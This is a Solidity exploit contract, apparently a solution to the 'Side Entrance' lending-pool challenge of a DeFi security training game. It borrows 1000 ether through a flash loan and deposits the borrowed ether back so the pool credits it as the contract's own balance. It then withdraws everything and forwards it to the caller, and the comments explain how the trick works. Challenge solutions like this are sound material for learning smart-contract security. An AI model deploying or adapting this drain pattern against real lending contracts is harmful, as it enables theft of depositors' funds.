//SPDX-License Identifier: MIT

pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";

contract FlashLoanEtherRecieverActual is IFlashLoanEtherReceiver{
    SideEntranceLenderPool immutable pool_to_scam;
    constructor (address poolAddr){
        pool_to_scam = SideEntranceLenderPool(poolAddr);
    }
    function executeFlashLoan() public {
        pool_to_scam.flashLoan(1000 ether);
    }
    function execute() external override payable{
        // This make it seems like the FlashLoanEtherRecieveActual deposited its own money, but in actual fact it is depositing what it borrowed
        // so that the transaction does not fail and get reverted
        // This way it is recorded that the contract deposited some money.
        pool_to_scam.deposit{value:msg.value}();
    }
    function drain() public payable {
        pool_to_scam.withdraw();
        (bool success,) = address(msg.sender).call{value:address(this).balance}("");
        require(success);
    }

    // function transfer() public payable{
    //     (bool success,) = address(this).call{value:address(this).balance}("");
    //     require(SUCESS)
    // }

    receive () external payable{

    }

    fallback () external payable{

    }
}